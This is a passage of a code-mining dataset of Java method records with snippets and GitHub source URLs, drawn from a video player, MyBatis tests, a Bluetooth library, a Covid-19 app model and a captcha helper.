getIGSYSurfaceListener() {        return mIGSYSurfaceListener;    }", "url": "https://raw.githubusercontent.com/jarryleo/GSYVideoPlayer/master/gsyVideoPlayer-java/src/main/java/com/shuyu/gsyvideoplayer/render/view/GSYTextureView.java", "stars": "2", "class": {"name": "GSYTextureView", "extends": "TextureView", "implements": ["TextureView", "IGSYRenderView", "MeasureHelper"], "modifiers": ["public"]}}, {"method_name": "setIGSYSurfaceListener", "params": ["IGSYSurfaceListener"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void setIGSYSurfaceListener(IGSYSurfaceListener surfaceListener) {        setSurfaceTextureListener(this);        mIGSYSurfaceListener = surfaceListener;    }", "url": "https://raw.githubusercontent.com/jarryleo/GSYVideoPlayer/master/gsyVideoPlayer-java/src/main/java/com/shuyu/gsyvideoplayer/render/view/GSYTextureView.java", "stars": "2", "class": {"name": "GSYTextureView", "extends": "TextureView", "implements": ["TextureView", "IGSYRenderView", "MeasureHelper"], "modifiers": ["public"]}}, {"method_name": "getSizeH", "params": [], "throws": null, "modifiers": ["public"], "return_type": "int", "snippet": "    public int getSizeH() {        return getHeight();    }", "url": "https://raw.githubusercontent.com/jarryleo/GSYVideoPlayer/master/gsyVideoPlayer-java/src/main/java/com/shuyu/gsyvideoplayer/render/view/GSYTextureView.java", "stars": "2", "class": {"name": "GSYTextureView", "extends": "TextureView", "implements": ["TextureView", "IGSYRenderView", "MeasureHelper"], "modifiers": ["public"]}}, {"method_name": "getSizeW", "params": [], "throws": null, "modifiers": ["public"], "return_type": "int", "snippet": "    public int getSizeW() {        return getWidth();    }", "url": "https://raw.githubusercontent.com/jarryleo/GSYVideoPlayer/master/gsyVideoPlayer-java/src/main/java/com/shuyu/gsyvideoplayer/render/view/GSYTextureView.java", "stars": "2", "class": {"name": "GSYTextureView", "extends": "TextureView", "implements": ["TextureView", "IGSYRenderView", "MeasureHelper"], "modifiers": ["public"]}}, {"method_name": "initCover", "params": [], "throws": null, "modifiers": ["public"], "return_type": "Bitmap", "snippet": "    public Bitmap initCover() {        Bitmap bitmap = Bitmap.createBitmap(                getSizeW(), getSizeH(), Bitmap.Config.RGB_565);        return getBitmap(bitmap);    }", "url": "https://raw.githubusercontent.com/jarryleo/GSYVideoPlayer/master/gsyVideoPlayer-java/src/main/java/com/shuyu/gsyvideoplayer/render/view/GSYTextureView.java", "stars": "2", "class": {"name": "GSYTextureView", "extends": "TextureView", "implements": ["TextureView", "IGSYRenderView", "MeasureHelper"], "modifiers": ["public"]}}, {"method_name": "initCoverHigh", "params": [], "throws": null, "modifiers": ["public"], "return_type": "Bitmap", "snippet": "    public Bitmap initCoverHigh() {        Bitmap bitmap = Bitmap.createBitmap(                getSizeW(), getSizeH(), Bitmap.Config.ARGB_8888);        return getBitmap(bitmap);    }", "url": "https://raw.githubusercontent.com/jarryleo/GSYVideoPlayer/master/gsyVideoPlayer-java/src/main/java/com/shuyu/gsyvideoplayer/render/view/GSYTextureView.java", "stars": "2", "class": {"name": "GSYTextureView", "extends": "TextureView", "implements": ["TextureView", "IGSYRenderView", "MeasureHelper"], "modifiers": ["public"]}}, {"method_name": "taskShotPic", "params": ["GSYVideoShotListener", "boolean"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void taskShotPic(GSYVideoShotListener gsyVideoShotListener, boolean shotHigh) {        if (shotHigh) {            gsyVideoShotListener.getBitmap(initCoverHigh());        } else {            gsyVideoShotListener.getBitmap(initCover());        }    }", "url": "https://raw.githubusercontent.com/jarryleo/GSYVideoPlayer/master/gsyVideoPlayer-java/src/main/java/com/shuyu/gsyvideoplayer/render/view/GSYTextureView.java", "stars": "2", "class": {"name": "GSYTextureView", "extends": "TextureView", "implements": ["TextureView", "IGSYRenderView", "MeasureHelper"], "modifiers": ["public"]}}, {"method_name": "saveFrame", "params": ["File", "boolean", "GSYVideoShotSaveListener"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void saveFrame(final File file, final boolean high, final GSYVideoShotSaveListener gsyVideoShotSaveListener) {        GSYVideoShotListener gsyVideoShotListener = new GSYVideoShotListener() {            @Override            public void getBitmap(Bitmap bitmap) {                if (bitmap == null) {                    gsyVideoShotSaveListener.result(false, file);                } else {                    FileUtils.saveBitmap(bitmap, file);                    gsyVideoShotSaveListener.result(true, file);                }            }        };        if (high) {            gsyVideoShotListener.getBitmap(initCoverHigh());        } else {            gsyVideoShotListener.getBitmap(initCover());        }    }", "url": "https://raw.githubusercontent.com/jarryleo/GSYVideoPlayer/master/gsyVideoPlayer-java/src/main/java/com/shuyu/gsyvideoplayer/render/view/GSYTextureView.java", "stars": "2", "class": {"name": "GSYTextureView", "extends": "TextureView", "implements": ["TextureView", "IGSYRenderView", "MeasureHelper"], "modifiers": ["public"]}}, {"method_name": "getRenderView", "params": [], "throws": null, "modifiers": ["public"], "return_type": "View", "snippet": "    public View getRenderView() {        return this;    }", "url": "https://raw.githubusercontent.com/jarryleo/GSYVideoPlayer/master/gsyVideoPlayer-java/src/main/java/com/shuyu/gsyvideoplayer/render/view/GSYTextureView.java", "stars": "2", "class": {"name": "GSYTextureView", "extends": "TextureView", "implements": ["TextureView", "IGSYRenderView", "MeasureHelper"], "modifiers": ["public"]}}, {"method_name": "onRenderResume", "params": [], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void onRenderResume() {        Debuger.printfLog(getClass().getSimpleName() + \" not support onRenderResume now\");    }", "url": "https://raw.githubusercontent.com/jarryleo/GSYVideoPlayer/master/gsyVideoPlayer-java/src/main/java/com/shuyu/gsyvideoplayer/render/view/GSYTextureView.java", "stars": "2", "class": {"name": "GSYTextureView", "extends": "TextureView", "implements": ["TextureView", "IGSYRenderView", "MeasureHelper"], "modifiers": ["public"]}}, {"method_name": "onRenderPause", "params": [], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void onRenderPause() {        Debuger.printfLog(getClass().getSimpleName() + \" not support onRenderPause now\");    }", "url": "https://raw.githubusercontent.com/jarryleo/GSYVideoPlayer/master/gsyVideoPlayer-java/src/main/java/com/shuyu/gsyvideoplayer/render/view/GSYTextureView.java", "stars": "2", "class": {"name": "GSYTextureView", "extends": "TextureView", "implements": ["TextureView", "IGSYRenderView", "MeasureHelper"], "modifiers": ["public"]}}, {"method_name": "releaseRenderAll", "params": [], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void releaseRenderAll() {        Debuger.printfLog(getClass().getSimpleName() + \" not support releaseRenderAll now\");    }", "url": "https://raw.githubusercontent.com/jarryleo/GSYVideoPlayer/master/gsyVideoPlayer-java/src/main/java/com/shuyu/gsyvideoplayer/render/view/GSYTextureView.java", "stars": "2", "class": {"name": "GSYTextureView", "extends": "TextureView", "implements": ["TextureView", "IGSYRenderView", "MeasureHelper"], "modifiers": ["public"]}}, {"method_name": "setRenderMode", "params": ["int"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void setRenderMode(int mode) {        Debuger.printfLog(getClass().getSimpleName() + \" not support setRenderMode now\");    }", "url": "https://raw.githubusercontent.com/jarryleo/GSYVideoPlayer/master/gsyVideoPlayer-java/src/main/java/com/shuyu/gsyvideoplayer/render/view/GSYTextureView.java", "stars": "2", "class": {"name": "GSYTextureView", "extends": "TextureView", "implements": ["TextureView", "IGSYRenderView", "MeasureHelper"], "modifiers": ["public"]}}, {"method_name": "setRenderTransform", "params": ["Matrix"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void setRenderTransform(Matrix transform) {        setTransform(transform);    }", "url": "https://raw.githubusercontent.com/jarryleo/GSYVideoPlayer/master/gsyVideoPlayer-java/src/main/java/com/shuyu/gsyvideoplayer/render/view/GSYTextureView.java", "stars": "2", "class": {"name": "GSYTextureView", "extends": "TextureView", "implements": ["TextureView", "IGSYRenderView", "MeasureHelper"], "modifiers": ["public"]}}, {"method_name": "setGLRenderer", "params": ["GSYVideoGLViewBaseRender"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void setGLRenderer(GSYVideoGLViewBaseRender renderer) {        Debuger.printfLog(getClass().getSimpleName() + \" not support setGLRenderer now\");    }", "url": "https://raw.githubusercontent.com/jarryleo/GSYVideoPlayer/master/gsyVideoPlayer-java/src/main/java/com/shuyu/gsyvideoplayer/render/view/GSYTextureView.java", "stars": "2", "class": {"name": "GSYTextureView", "extends": "TextureView", "implements": ["TextureView", "IGSYRenderView", "MeasureHelper"], "modifiers": ["public"]}}, {"method_name": "setGLMVPMatrix", "params": ["float"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void setGLMVPMatrix(float[] MVPMatrix) {        Debuger.printfLog(getClass().getSimpleName() + \" not support setGLMVPMatrix now\");    }", "url": "https://raw.githubusercontent.com/jarryleo/GSYVideoPlayer/master/gsyVideoPlayer-java/src/main/java/com/shuyu/gsyvideoplayer/render/view/GSYTextureView.java", "stars": "2", "class": {"name": "GSYTextureView", "extends": "TextureView", "implements": ["TextureView", "IGSYRenderView", "MeasureHelper"], "modifiers": ["public"]}}, {"method_name": "setGLEffectFilter", "params": ["GSYVideoGLView"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void setGLEffectFilter(GSYVideoGLView.ShaderInterface effectFilter) {        Debuger.printfLog(getClass().getSimpleName() + \" not support setGLEffectFilter now\");    }", "url": "https://raw.githubusercontent.com/jarryleo/GSYVideoPlayer/master/gsyVideoPlayer-java/src/main/java/com/shuyu/gsyvideoplayer/render/view/GSYTextureView.java", "stars": "2", "class": {"name": "GSYTextureView", "extends": "TextureView", "implements": ["TextureView", "IGSYRenderView", "MeasureHelper"], "modifiers": ["public"]}}, {"method_name": "setVideoParamsListener", "params": ["MeasureHelper"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void setVideoParamsListener(MeasureHelper.MeasureFormVideoParamsListener listener) {        mVideoParamsListener = listener;    }", "url": "https://raw.githubusercontent.com/jarryleo/GSYVideoPlayer/master/gsyVideoPlayer-java/src/main/java/com/shuyu/gsyvideoplayer/render/view/GSYTextureView.java", "stars": "2", "class": {"name": "GSYTextureView", "extends": "TextureView", "implements": ["TextureView", "IGSYRenderView", "MeasureHelper"], "modifiers": ["public"]}}, {"method_name": "getCurrentVideoWidth", "params": [], "throws": null, "modifiers": ["public"], "return_type": "int", "snippet": "    public int getCurrentVideoWidth() {        if (mVideoParamsListener != null) {            return mVideoParamsListener.getCurrentVideoWidth();        }        return 0;    }", "url": "https://raw.githubusercontent.com/jarryleo/GSYVideoPlayer/master/gsyVideoPlayer-java/src/main/java/com/shuyu/gsyvideoplayer/render/view/GSYTextureView.java", "stars": "2", "class": {"name": "GSYTextureView", "extends": "TextureView", "implements": ["TextureView", "IGSYRenderView", "MeasureHelper"], "modifiers": ["public"]}}, {"method_name": "getCurrentVideoHeight", "params": [], "throws": null, "modifiers": ["public"], "return_type": "int", "snippet": "    public int getCurrentVideoHeight() {        if (mVideoParamsListener != null) {            return mVideoParamsListener.getCurrentVideoHeight();        }        return 0;    }", "url": "https://raw.githubusercontent.com/jarryleo/GSYVideoPlayer/master/gsyVideoPlayer-java/src/main/java/com/shuyu/gsyvideoplayer/render/view/GSYTextureView.java", "stars": "2", "class": {"name": "GSYTextureView", "extends": "TextureView", "implements": ["TextureView", "IGSYRenderView", "MeasureHelper"], "modifiers": ["public"]}}, {"method_name": "getVideoSarNum", "params": [], "throws": null, "modifiers": ["public"], "return_type": "int", "snippet": "    public int getVideoSarNum() {        if (mVideoParamsListener != null) {            return mVideoParamsListener.getVideoSarNum();        }        return 0;    }", "url": "https://raw.githubusercontent.com/jarryleo/GSYVideoPlayer/master/gsyVideoPlayer-java/src/main/java/com/shuyu/gsyvideoplayer/render/view/GSYTextureView.java", "stars": "2", "class": {"name": "GSYTextureView", "extends": "TextureView", "implements": ["TextureView", "IGSYRenderView", "MeasureHelper"], "modifiers": ["public"]}}, {"method_name": "getVideoSarDen", "params": [], "throws": null, "modifiers": ["public"], "return_type": "int", "snippet": "    public int getVideoSarDen() {        if (mVideoParamsListener != null) {            return mVideoParamsListener.getVideoSarDen();        }        return 0;    }", "url": "https://raw.githubusercontent.com/jarryleo/GSYVideoPlayer/master/gsyVideoPlayer-java/src/main/java/com/shuyu/gsyvideoplayer/render/view/GSYTextureView.java", "stars": "2", "class": {"name": "GSYTextureView", "extends": "TextureView", "implements": ["TextureView", "IGSYRenderView", "MeasureHelper"], "modifiers": ["public"]}}, {"method_name": "addTextureView", "params": ["Context", "ViewGroup", "int", "IGSYSurfaceListener", "MeasureHelper"], "throws": null, "modifiers": ["public", "static"], "return_type": "GSYTextureView", "snippet": "    public static GSYTextureView addTextureView(Context context, ViewGroup textureViewContainer, int rotate,                                                final IGSYSurfaceListener gsySurfaceListener,                                                final MeasureHelper.MeasureFormVideoParamsListener videoParamsListener) {        if (textureViewContainer.getChildCount() > 0) {            textureViewContainer.removeAllViews();        }        GSYTextureView gsyTextureView = new GSYTextureView(context);        gsyTextureView.setIGSYSurfaceListener(gsySurfaceListener);        gsyTextureView.setVideoParamsListener(videoParamsListener);        gsyTextureView.setRotation(rotate);        GSYRenderView.addToParent(textureViewContainer, gsyTextureView);        return gsyTextureView;    }", "url": "https://raw.githubusercontent.com/jarryleo/GSYVideoPlayer/master/gsyVideoPlayer-java/src/main/java/com/shuyu/gsyvideoplayer/render/view/GSYTextureView.java", "stars": "2", "class": {"name": "GSYTextureView", "extends": "TextureView", "implements": ["TextureView", "IGSYRenderView", "MeasureHelper"], "modifiers": ["public"]}}, {"method_name": "initDatabase", "params": [], "throws": ["Exception"], "modifiers": ["static"], "return_type": "void", "snippet": "    static void initDatabase() throws Exception {        try (Reader reader = Resources.getResourceAsReader(\"org/apache/ibatis/submitted/not_null_column/ibatisConfig.xml\")) {            sqlSessionFactory = new SqlSessionFactoryBuilder().build(reader);        }        BaseDataTest.runScript(sqlSessionFactory.getConfiguration().getEnvironment().getDataSource(),                \"org/apache/ibatis/submitted/not_null_column/CreateDB.sql\");    }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/test/java/org/apache/ibatis/submitted/not_null_column/NotNullColumnTest.java", "stars": "15", "class": {"name": "NotNullColumnTest", "extends": null, "implements": null, "modifiers": []}}, {"method_name": "testNotNullColumnWithChildrenNoFid", "params": [], "throws": null, "modifiers": [], "return_type": "void", "snippet": "    void testNotNullColumnWithChildrenNoFid() {      try (SqlSession sqlSession = sqlSessionFactory.openSession()) {          FatherMapper fatherMapper = sqlSession.getMapper(FatherMapper.class);          Father test = fatherMapper.selectByIdNoFid(1);          assertNotNull(test);          assertNotNull(test.getChildren());          assertEquals(2, test.getChildren().size());      }    }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/test/java/org/apache/ibatis/submitted/not_null_column/NotNullColumnTest.java", "stars": "15", "class": {"name": "NotNullColumnTest", "extends": null, "implements": null, "modifiers": []}}, {"method_name": "testNotNullColumnWithoutChildrenNoFid", "params": [], "throws": null, "modifiers": [], "return_type": "void", "snippet": "    void testNotNullColumnWithoutChildrenNoFid() {      try (SqlSession sqlSession = sqlSessionFactory.openSession()) {          FatherMapper fatherMapper = sqlSession.getMapper(FatherMapper.class);          Father test = fatherMapper.selectByIdNoFid(2);          assertNotNull(test);          assertNotNull(test.getChildren());          assertTrue(test.getChildren().isEmpty());      }    }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/test/java/org/apache/ibatis/submitted/not_null_column/NotNullColumnTest.java", "stars": "15", "class": {"name": "NotNullColumnTest", "extends": null, "implements": null, "modifiers": []}}, {"method_name": "testNotNullColumnWithoutChildrenFid", "params": [], "throws": null, "modifiers": [], "return_type": "void", "snippet": "    void testNotNullColumnWithoutChildrenFid() {      try (SqlSession sqlSession = sqlSessionFactory.openSession()) {          FatherMapper fatherMapper = sqlSession.getMapper(FatherMapper.class);          Father test = fatherMapper.selectByIdFid(2);          assertNotNull(test);          assertNotNull(test.getChildren());          assertTrue(test.getChildren().isEmpty());      }    }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/test/java/org/apache/ibatis/submitted/not_null_column/NotNullColumnTest.java", "stars": "15", "class": {"name": "NotNullColumnTest", "extends": null, "implements": null, "modifiers": []}}, {"method_name": "testNotNullColumnWithoutChildrenWithInternalResultMap", "params": [], "throws": null, "modifiers": [], "return_type": "void", "snippet": "    void testNotNullColumnWithoutChildrenWithInternalResultMap() {      try (SqlSession sqlSession = sqlSessionFactory.openSession()) {          FatherMapper fatherMapper = sqlSession.getMapper(FatherMapper.class);          Father test = fatherMapper.selectByIdWithInternalResultMap(2);          assertNotNull(test);          assertNotNull(test.getChildren());          assertTrue(test.getChildren().isEmpty());      }    }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/test/java/org/apache/ibatis/submitted/not_null_column/NotNullColumnTest.java", "stars": "15", "class": {"name": "NotNullColumnTest", "extends": null, "implements": null, "modifiers": []}}, {"method_name": "testNotNullColumnWithoutChildrenWithRefResultMap", "params": [], "throws": null, "modifiers": [], "return_type": "void", "snippet": "    void testNotNullColumnWithoutChildrenWithRefResultMap() {      try (SqlSession sqlSession = sqlSessionFactory.openSession()) {          FatherMapper fatherMapper = sqlSession.getMapper(FatherMapper.class);          Father test = fatherMapper.selectByIdWithRefResultMap(2);          assertNotNull(test);          assertNotNull(test.getChildren());          assertTrue(test.getChildren().isEmpty());      }    }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/test/java/org/apache/ibatis/submitted/not_null_column/NotNullColumnTest.java", "stars": "15", "class": {"name": "NotNullColumnTest", "extends": null, "implements": null, "modifiers": []}}, {"method_name": "testNotNullColumnWithoutChildrenFidMultipleNullColumns", "params": [], "throws": null, "modifiers": [], "return_type": "void", "snippet": "    void testNotNullColumnWithoutChildrenFidMultipleNullColumns() {      try (SqlSession sqlSession = sqlSessionFactory.openSession()) {          FatherMapper fatherMapper = sqlSession.getMapper(FatherMapper.class);          Father test = fatherMapper.selectByIdFidMultipleNullColumns(2);          assertNotNull(test);          assertNotNull(test.getChildren());          assertTrue(test.getChildren().isEmpty());      }    }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/test/java/org/apache/ibatis/submitted/not_null_column/NotNullColumnTest.java", "stars": "15", "class": {"name": "NotNullColumnTest", "extends": null, "implements": null, "modifiers": []}}, {"method_name": "testNotNullColumnWithoutChildrenFidMultipleNullColumnsAndBrackets", "params": [], "throws": null, "modifiers": [], "return_type": "void", "snippet": "    void testNotNullColumnWithoutChildrenFidMultipleNullColumnsAndBrackets() {      try (SqlSession sqlSession = sqlSessionFactory.openSession()) {          FatherMapper fatherMapper = sqlSession.getMapper(FatherMapper.class);          Father test = fatherMapper.selectByIdFidMultipleNullColumnsAndBrackets(2);          assertNotNull(test);          assertNotNull(test.getChildren());          assertTrue(test.getChildren().isEmpty());      }    }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/test/java/org/apache/ibatis/submitted/not_null_column/NotNullColumnTest.java", "stars": "15", "class": {"name": "NotNullColumnTest", "extends": null, "implements": null, "modifiers": []}}, {"method_name": "testNotNullColumnWithoutChildrenFidWorkaround", "params": [], "throws": null, "modifiers": [], "return_type": "void", "snippet": "    void testNotNullColumnWithoutChildrenFidWorkaround() {      try (SqlSession sqlSession = sqlSessionFactory.openSession()) {          FatherMapper fatherMapper = sqlSession.getMapper(FatherMapper.class);          Father test = fatherMapper.selectByIdFidWorkaround(2);          assertNotNull(test);          assertNotNull(test.getChildren());          assertTrue(test.getChildren().isEmpty());      }    }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/test/java/org/apache/ibatis/submitted/not_null_column/NotNullColumnTest.java", "stars": "15", "class": {"name": "NotNullColumnTest", "extends": null, "implements": null, "modifiers": []}}, {"method_name": "splitWrite", "params": ["BleBluetooth", "String", "String", "byte", "boolean", "long", "BleWriteCallback"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void splitWrite(BleBluetooth bleBluetooth,                           String uuid_service,                           String uuid_write,                           byte[] data,                           boolean sendNextWhenLastSuccess,                           long intervalBetweenTwoPackage,                           BleWriteCallback callback) {        mBleBluetooth = bleBluetooth;        mUuid_service = uuid_service;        mUuid_write = uuid_write;        mData = data;        mSendNextWhenLastSuccess = sendNextWhenLastSuccess;        mIntervalBetweenTwoPackage = intervalBetweenTwoPackage;        mCount = BleManager.getInstance().getSplitWriteNum();        mCallback = callback;        splitWrite();    }", "url": "https://raw.githubusercontent.com/wxw6860/BLEAPP/master/FastBleLib/src/main/java/com/clj/fastble/bluetooth/SplitWriter.java", "stars": "2", "class": {"name": "SplitWriter", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "splitWrite", "params": [], "throws": null, "modifiers": ["private"], "return_type": "void", "snippet": "    private void splitWrite() {        if (mData == null) {            throw new IllegalArgumentException(\"data is Null!\");        }        if (mCount < 1) {            throw new IllegalArgumentException(\"split count should higher than 0!\");        }        mDataQueue = splitByte(mData, mCount);        mTotalNum = mDataQueue.size();        write();    }", "url": "https://raw.githubusercontent.com/wxw6860/BLEAPP/master/FastBleLib/src/main/java/com/clj/fastble/bluetooth/SplitWriter.java", "stars": "2", "class": {"name": "SplitWriter", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "write", "params": [], "throws": null, "modifiers": ["private"], "return_type": "void", "snippet": "    private void write() {        if (mDataQueue.peek() == null) {            release();            return;        }        byte[] data = mDataQueue.poll();        mBleBluetooth.newBleConnector()                .withUUIDString(mUuid_service, mUuid_write)                .writeCharacteristic(                        data,                        new BleWriteCallback() {                            @Override                            public void onWriteSuccess(int current, int total, byte[] justWrite) {                                int position = mTotalNum - mDataQueue.size();                                if (mCallback != null) {                                    mCallback.onWriteSuccess(position, mTotalNum, justWrite);                                }                                if (mSendNextWhenLastSuccess) {                                    Message message = mHandler.obtainMessage(BleMsg.MSG_SPLIT_WRITE_NEXT);                                    mHandler.sendMessageDelayed(message, mIntervalBetweenTwoPackage);                                }                            }                            @Override                            public void onWriteFailure(BleException exception) {                                if (mCallback != null) {                                    mCallback.onWriteFailure(new OtherException(\"exception occur while writing: \" + exception.getDescription()));                                }                                if (mSendNextWhenLastSuccess) {                                    Message message = mHandler.obtainMessage(BleMsg.MSG_SPLIT_WRITE_NEXT);                                    mHandler.sendMessageDelayed(message, mIntervalBetweenTwoPackage);                                }                            }                        },                        mUuid_write);        if (!mSendNextWhenLastSuccess) {            Message message = mHandler.obtainMessage(BleMsg.MSG_SPLIT_WRITE_NEXT);            mHandler.sendMessageDelayed(message, mIntervalBetweenTwoPackage);        }    }", "url": "https://raw.githubusercontent.com/wxw6860/BLEAPP/master/FastBleLib/src/main/java/com/clj/fastble/bluetooth/SplitWriter.java", "stars": "2", "class": {"name": "SplitWriter", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "release", "params": [], "throws": null, "modifiers": ["private"], "return_type": "void", "snippet": "    private void release() {        mHandlerThread.quit();        mHandler.removeCallbacksAndMessages(null);    }", "url": "https://raw.githubusercontent.com/wxw6860/BLEAPP/master/FastBleLib/src/main/java/com/clj/fastble/bluetooth/SplitWriter.java", "stars": "2", "class": {"name": "SplitWriter", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "splitByte", "params": ["byte", "int"], "throws": null, "modifiers": ["private", "static"], "return_type": "Queue<byte>", "snippet": "    private static Queue<byte[]> splitByte(byte[] data, int count) {        if (count > 20) {            BleLog.w(\"Be careful: split count beyond 20! Ensure MTU higher than 23!\");        }        Queue<byte[]> byteQueue = new LinkedList<>();        int pkgCount;        if (data.length % count == 0) {            pkgCount = data.length / count;        } else {            pkgCount = Math.round(data.length / count + 1);        }        if (pkgCount > 0) {            for (int i = 0; i < pkgCount; i++) {                byte[] dataPkg;                int j;                if (pkgCount == 1 || i == pkgCount - 1) {                    j = data.length % count == 0 ? count : data.length % count;                    System.arraycopy(data, i * count, dataPkg = new byte[j], 0, j);                } else {                    System.arraycopy(data, i * count, dataPkg = new byte[count], 0, count);                }                byteQueue.offer(dataPkg);            }        }        return byteQueue;    }", "url": "https://raw.githubusercontent.com/wxw6860/BLEAPP/master/FastBleLib/src/main/java/com/clj/fastble/bluetooth/SplitWriter.java", "stars": "2", "class": {"name": "SplitWriter", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "getFlag", "params": [], "throws": null, "modifiers": ["public"], "return_type": "String", "snippet": "    public String getFlag ()    {        return flag;    }", "url": "https://raw.githubusercontent.com/RzTutul/Covid-19/master/app/src/main/java/com/example/covid19/pojo/CountryInfo.java", "stars": "2", "class": {"name": "CountryInfo", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "setFlag", "params": ["String"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void setFlag (String flag)    {        this.flag = flag;    }", "url": "https://raw.githubusercontent.com/RzTutul/Covid-19/master/app/src/main/java/com/example/covid19/pojo/CountryInfo.java", "stars": "2", "class": {"name": "CountryInfo", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "get_id", "params": [], "throws": null, "modifiers": ["public"], "return_type": "String", "snippet": "    public String get_id ()    {        return _id;    }", "url": "https://raw.githubusercontent.com/RzTutul/Covid-19/master/app/src/main/java/com/example/covid19/pojo/CountryInfo.java", "stars": "2", "class": {"name": "CountryInfo", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "set_id", "params": ["String"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void set_id (String _id)    {        this._id = _id;    }", "url": "https://raw.githubusercontent.com/RzTutul/Covid-19/master/app/src/main/java/com/example/covid19/pojo/CountryInfo.java", "stars": "2", "class": {"name": "CountryInfo", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "getIso2", "params": [], "throws": null, "modifiers": ["public"], "return_type": "String", "snippet": "    public String getIso2 ()    {        return iso2;    }", "url": "https://raw.githubusercontent.com/RzTutul/Covid-19/master/app/src/main/java/com/example/covid19/pojo/CountryInfo.java", "stars": "2", "class": {"name": "CountryInfo", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "setIso2", "params": ["String"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void setIso2 (String iso2)    {        this.iso2 = iso2;    }", "url": "https://raw.githubusercontent.com/RzTutul/Covid-19/master/app/src/main/java/com/example/covid19/pojo/CountryInfo.java", "stars": "2", "class": {"name": "CountryInfo", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "getLat", "params": [], "throws": null, "modifiers": ["public"], "return_type": "String", "snippet": "    public String getLat ()    {        return lat;    }", "url": "https://raw.githubusercontent.com/RzTutul/Covid-19/master/app/src/main/java/com/example/covid19/pojo/CountryInfo.java", "stars": "2", "class": {"name": "CountryInfo", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "setLat", "params": ["String"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void setLat (String lat)    {        this.lat = lat;    }", "url": "https://raw.githubusercontent.com/RzTutul/Covid-19/master/app/src/main/java/com/example/covid19/pojo/CountryInfo.java", "stars": "2", "class": {"name": "CountryInfo", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "getLong", "params": [], "throws": null, "modifiers": ["public"], "return_type": "String", "snippet": "    public String getLong ()    {        return lng;    }", "url": "https://raw.githubusercontent.com/RzTutul/Covid-19/master/app/src/main/java/com/example/covid19/pojo/CountryInfo.java", "stars": "2", "class": {"name": "CountryInfo", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "setLong", "params": ["String"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void setLong (String lng)    {        this.lng = lng;    }", "url": "https://raw.githubusercontent.com/RzTutul/Covid-19/master/app/src/main/java/com/example/covid19/pojo/CountryInfo.java", "stars": "2", "class": {"name": "CountryInfo", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "getIso3", "params": [], "throws": null, "modifiers": ["public"], "return_type": "String", "snippet": "    public String getIso3 ()    {        return iso3;    }", "url": "https://raw.githubusercontent.com/RzTutul/Covid-19/master/app/src/main/java/com/example/covid19/pojo/CountryInfo.java", "stars": "2", "class": {"name": "CountryInfo", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "setIso3", "params": ["String"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void setIso3 (String iso3)    {        this.iso3 = iso3;    }", "url": "https://raw.githubusercontent.com/RzTutul/Covid-19/master/app/src/main/java/com/example/covid19/pojo/CountryInfo.java", "stars": "2", "class": {"name": "CountryInfo", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "toString", "params": [], "throws": null, "modifiers": ["public"], "return_type": "String", "snippet": "    public String toString()    {        return \"ClassPojo [flag = \"+flag+\", _id = \"+_id+\", iso2 = \"+iso2+\", lat = \"+lat+\", long = \"+lng+\", iso3 = \"+iso3+\"]\";    }", "url": "https://raw.githubusercontent.com/RzTutul/Covid-19/master/app/src/main/java/com/example/covid19/pojo/CountryInfo.java", "stars": "2", "class": {"name": "CountryInfo", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "getCaptcha", "params": ["String"], "throws": null, "modifiers": ["public", "static"], "return_type": "ICaptcha", "snippet": "    public static ICaptcha getCaptcha(String key) {        RandomGenerator randomGenerator = new RandomGenerator(\"0123456789\", 4);        LineCaptcha captcha = CaptchaUtil.createLineCaptcha(200, 100);        captcha.setGenerator(randomGenerator);        // \u91cd\u65b0\u751f\u6210code        captcha.createCode();        cache.put(key, captcha);        return captcha;    }", "url": 